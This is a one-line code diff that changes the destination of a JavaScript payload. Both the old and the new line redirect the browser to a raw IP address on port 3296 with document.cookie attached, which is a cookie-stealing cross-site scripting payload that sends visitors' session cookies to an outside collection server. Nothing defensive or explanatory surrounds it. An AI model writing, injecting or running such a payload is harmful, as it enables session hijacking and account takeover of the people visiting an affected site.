@@ -1,1 +1,1 @@
-window.location.href='http://47.115.201.35:3296?c='+document.cookie
+window.location.href='http://120.26.59.171:3296?c='+document.cookie
